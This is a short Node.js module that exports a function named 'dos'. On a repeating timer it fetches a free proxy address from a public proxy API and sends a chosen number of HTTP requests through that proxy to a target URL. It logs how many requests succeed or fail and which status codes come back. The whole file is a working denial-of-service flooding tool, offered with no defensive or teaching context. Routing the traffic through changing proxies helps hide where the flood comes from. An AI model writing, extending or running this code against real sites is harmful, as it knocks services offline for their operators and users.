const request = require('request');
const proxyUrl = 'http://pubproxy.com/api/proxy?format=json';

const dos = (targetUrl, qty, ms) => {
    let err = 0, ok = 0;
    let counter = 1;
    let statusCodes = {};

    setInterval(() => {
        request(proxyUrl, (error, response, body) => {
            if (!error && response.statusCode == 200) {
                const proxyData = JSON.parse(body).data[0];
                const proxyUrl = `http://${proxyData.ipPort}`;
                const requestOptions = {
                    url: targetUrl,
                    proxy: proxyUrl
                };

                for (let i = 0; i < qty; i++) {
                    request(requestOptions, (error, response) => {
                        if (error) {
                            err++;
                        } else {
                            ok++;
                            const statusCode = response.statusCode;
                            
                            if (statusCodes[statusCode]) {
                                statusCodes[statusCode]++;
                            } else {
                                statusCodes[statusCode] = 1;
                            }
                        }
                    });
                }
            }
        });

        const statusCodesString = Object.entries(statusCodes)
            .map(([code, count]) => `${code}: ${count}`)
            .join(', ');

        console.log(`${counter}: ${targetUrl} ${ok} ${err} Status Codes: ${statusCodesString}`);
        
        counter++;
        err = ok = 0;
        statusCodes = {};
    }, ms);
};

module.exports = dos;
